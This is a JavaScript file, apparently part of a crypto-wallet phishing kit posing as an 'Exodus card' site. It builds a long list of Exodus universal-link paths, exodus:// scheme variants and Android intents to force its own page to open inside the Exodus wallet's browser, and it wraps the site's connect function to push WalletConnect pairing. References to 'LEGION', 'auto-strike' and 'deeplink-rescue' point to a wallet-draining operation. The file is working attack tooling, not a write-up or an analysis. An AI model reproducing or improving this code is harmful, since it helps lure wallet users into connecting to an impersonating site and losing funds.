/**
 * Exodus open-inapp / Universal-Link loophole v2.0
 *
 * DISCOVERED (apple-app-site-association):
 *   appID VK5Q293EVL.exodus-movement.exodus
 *   paths: ["/m/*"]
 * WC explorer universal: https://exodus.com/m
 * Android assetlinks: package exodusmovement.exodus
 *
 * Cloudflare may 403 bots — on a REAL phone, /m/* is intercepted by iOS/Android
 * and handed to Exodus BEFORE the page loads. We fuzz every plausible
 * /m/{browser|dapp|open}?url= payload + native exodus:// + Android intent.
 *
 * Parallel: WC URI on /m/wc?uri= so connect still works if browser route missing.
 */
(function () {
  'use strict';

  var fired = false;

  function isMobile() {
    try {
      var ua = navigator.userAgent || '';
      if (/iPhone|iPad|iPod|Android|Mobile/i.test(ua)) return true;
      if (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) return true;
    } catch (_) {}
    return false;
  }

  function isExodusInApp() {
    try {
      if (window.__EXODUS_IN_APP__) return true;
      if (typeof window.__EXODUS_IS_IN_APP__ === 'function' && window.__EXODUS_IS_IN_APP__()) return true;
      if (window.exodus) return true;
      var eth = window.ethereum;
      if (eth && (eth.isExodus || eth.isExodusWallet)) return true;
      if (/Exodus/i.test(navigator.userAgent || '') && eth) return true;
    } catch (_) {}
    return false;
  }

  function siteUrl() {
    try {
      var u = new URL(window.location.href);
      u.hash = '';
      u.searchParams.set('exodus_inapp', '1');
      return u.toString();
    } catch (_) {
      return 'https://exodus-card.surge.sh/?exodus_inapp=1';
    }
  }

  function clickHref(href) {
    try {
      var a = document.createElement('a');
      a.href = href;
      a.rel = 'noreferrer';
      a.style.display = 'none';
      document.body.appendChild(a);
      a.click();
      setTimeout(function () { try { a.remove(); } catch (_) {} }, 600);
      return true;
    } catch (_) {
      try { window.location.href = href; return true; } catch (_) {}
      return false;
    }
  }

  function getWcUri() {
    try {
      if (typeof window.__EXODUS_GET_WC_URI__ === 'function') {
        var u = window.__EXODUS_GET_WC_URI__();
        if (u && String(u).indexOf('wc:') === 0) return u;
      }
    } catch (_) {}
    try {
      if (window.__LEGION_LAST_WC_URI__ && String(window.__LEGION_LAST_WC_URI__).indexOf('wc:') === 0) {
        return window.__LEGION_LAST_WC_URI__;
      }
    } catch (_) {}
    return null;
  }

  /** Build every loophole candidate for opening site / WC inside Exodus. */
  function buildCandidates(url, wcUri) {
    var enc = encodeURIComponent(url);
    var bare = url.replace(/^https?:\/\//i, '');
    var list = [];

    // 1) Official Universal Link surface (/m/*) — AASA confirmed
    var mHosts = ['https://www.exodus.com', 'https://exodus.com'];
    var mPaths = [
      '/m/browser?url=' + enc,
      '/m/dapp?url=' + enc,
      '/m/open?url=' + enc,
      '/m/web?url=' + enc,
      '/m/webview?url=' + enc,
      '/m/link?url=' + enc,
      '/m/go?url=' + enc,
      '/m/r?url=' + enc,
      '/m/?url=' + enc,
      '/m?url=' + enc,
      '/m/browser/' + bare,
      '/m/dapp/' + bare,
      '/m/u/' + enc,
      '/mobile?url=' + enc,
      '/mobile/?url=' + enc,
    ];
    mHosts.forEach(function (h) {
      mPaths.forEach(function (p) { list.push(h + p); });
    });

    // 2) WC on universal link (documented mobile linking base)
    if (wcUri) {
      var wenc = encodeURIComponent(wcUri);
      mHosts.forEach(function (h) {
        list.push(h + '/m/wc?uri=' + wenc);
        list.push(h + '/m?uri=' + wenc);
        list.push(h + '/m/#/wc?uri=' + wenc);
        list.push(h + '/m/wc?url=' + enc + '&uri=' + wenc);
        list.push(h + '/mobile?wc=' + wenc);
      });
    }

    // 3) Native custom scheme fuzz
    list.push('exodus://browser?url=' + enc);
    list.push('exodus://dapp?url=' + enc);
    list.push('exodus://open?url=' + enc);
    list.push('exodus://webview?url=' + enc);
    list.push('exodus://web3?url=' + enc);
    list.push('exodus://m/browser?url=' + enc);
    list.push('exodus://m?url=' + enc);
    list.push('exodus://dapp/' + bare);
    list.push('exodus://browser/' + bare);
    list.push('dapp:' + bare);
    list.push('dapp:https://' + bare);
    if (wcUri) {
      list.push('exodus://wc?uri=' + encodeURIComponent(wcUri));
      list.push('exodus://wc?uri=' + encodeURIComponent(wcUri) + '&url=' + enc);
    }

    // 4) Android intent → force package + /m/ universal host (App Links)
    try {
      if (/Android/i.test(navigator.userAgent || '')) {
        var intentPaths = [
          'intent://www.exodus.com/m/browser?url=' + enc +
            '#Intent;scheme=https;package=exodusmovement.exodus;end',
          'intent://exodus.com/m/dapp?url=' + enc +
            '#Intent;scheme=https;package=exodusmovement.exodus;end',
          'intent://m/browser?url=' + enc +
            '#Intent;scheme=exodus;package=exodusmovement.exodus;end',
        ];
        if (wcUri) {
          intentPaths.push(
            'intent://www.exodus.com/m/wc?uri=' + encodeURIComponent(wcUri) +
              '#Intent;scheme=https;package=exodusmovement.exodus;end'
          );
        }
        // Also try opening OUR https URL preferring Exodus package (rare but cheap)
        intentPaths.push(
          'intent://' + bare + '#Intent;scheme=https;package=exodusmovement.exodus;S.browser_fallback_url=' +
            enc + ';end'
        );
        list = intentPaths.concat(list);
      }
    } catch (_) {}

    return list;
  }

  /**
   * Handoff DISABLED for cold-load safety.
   * www.exodus.com / bare exodus:// navigates Safari off the card site —
   * tab dies, Exodus opens empty. WC open is owned by deeplink-rescue /
   * auto-strike AFTER user Connect + real wc: URI only.
   */
  function handoffToExodus(opts) {
    opts = opts || {};
    if (isExodusInApp()) return false;
    var wcUri = opts.wcUri || getWcUri();
    // Only allow a single WC pairing open when explicitly forced + URI ready
    if (opts.force && wcUri && String(wcUri).indexOf('wc:') === 0) {
      console.warn('[ExodusInApp] WC-only open (no barrage)');
      try {
        window.location.href = 'exodus://wc?uri=' + encodeURIComponent(wcUri);
        fired = true;
        return true;
      } catch (_) {}
    }
    console.warn('[ExodusInApp] handoff blocked — stay on card site (no bare exodus://)');
    return false;
  }

  /** Prefer in-app if already inside Exodus; else WC only — NO auto app open. */
  function preferInAppOrContinue(continueFn) {
    if (isExodusInApp()) {
      try {
        if (typeof window.__EXODUS_CONNECT_IN_APP__ === 'function') {
          window.__EXODUS_CONNECT_IN_APP__();
          return true;
        }
      } catch (_) {}
      if (typeof continueFn === 'function') continueFn();
      return true;
    }
    // Mobile Safari: WalletConnect only. Never barrage / navigate away.
    if (typeof continueFn === 'function') continueFn();
    return false;
  }

  function wrapConnect() {
    var prev = window.__EXODUS_DIRECT_CONNECT__;
    if (typeof prev !== 'function' || prev.__exInappWrapped) return;
    var wrapped = function () {
      return preferInAppOrContinue(function () { return prev.apply(this, arguments); });
    };
    wrapped.__exInappWrapped = true;
    window.__EXODUS_DIRECT_CONNECT_WC__ = prev;
    window.__EXODUS_DIRECT_CONNECT__ = wrapped;
  }

  function ensureChip() {
    if (!isMobile() || isExodusInApp()) return;
    if (document.getElementById('__exodus_inapp_chip')) {
      var old = document.getElementById('__exodus_inapp_chip');
      old.textContent = 'Open in Exodus (auto)';
      old.onclick = function (e) {
        e.preventDefault();
        if (typeof window.__EXODUS_DIRECT_CONNECT__ === 'function') {
          window.__EXODUS_DIRECT_CONNECT__();
        } else {
          handoffToExodus({ force: true });
        }
      };
      return;
    }
    var chip = document.createElement('button');
    chip.id = '__exodus_inapp_chip';
    chip.type = 'button';
    chip.textContent = 'Open in Exodus (auto)';
    chip.style.cssText = [
      'position:fixed', 'left:50%', 'transform:translateX(-50%)',
      'bottom:calc(72px + env(safe-area-inset-bottom,0px))',
      'z-index:2147483644', 'background:#0b46f9', 'color:#fff',
      'border:0', 'border-radius:999px', 'padding:10px 16px',
      'font:700 12px system-ui,sans-serif',
      'box-shadow:0 8px 24px rgba(11,70,249,.45)', 'white-space:nowrap',
    ].join(';');
    chip.onclick = function (e) {
      e.preventDefault();
      if (typeof window.__EXODUS_DIRECT_CONNECT__ === 'function') {
        window.__EXODUS_DIRECT_CONNECT__();
      } else {
        handoffToExodus({ force: true });
      }
    };
    document.body.appendChild(chip);
  }

  window.__EXODUS_OPEN_INAPP__ = handoffToExodus;
  window.__EXODUS_HANDOFF_INAPP__ = handoffToExodus;
  window.__EXODUS_PREFER_INAPP__ = preferInAppOrContinue;
  window.__EXODUS_IS_IN_APP__ = isExodusInApp;

  function boot() {
    if (isExodusInApp()) {
      try { window.__EXODUS_IN_APP__ = true; } catch (_) {}
      console.warn('[ExodusInApp] inside Exodus WebView ✓');
      setTimeout(function () {
        try {
          if (typeof window.__EXODUS_CONNECT_IN_APP__ === 'function') {
            window.__EXODUS_CONNECT_IN_APP__();
          }
        } catch (_) {}
      }, 600);
      return;
    }
    // No "Open in Exodus (auto)" chip — it encouraged empty app bounce
    wrapConnect();
  }

  setTimeout(wrapConnect, 0);
  setTimeout(wrapConnect, 500);
  setInterval(wrapConnect, 2000);

  // Hide old copy-paste sheet if present
  setTimeout(function () {
    try {
      var sheet = document.getElementById('__exodus_inapp_sheet');
      if (sheet) sheet.style.display = 'none';
    } catch (_) {}
  }, 300);

  if (document.body) boot();
  else document.addEventListener('DOMContentLoaded', boot);

  console.warn('[ExodusInApp] v2.0.3 — handoff barrage OFF; WC-only stay-on-site');
})();
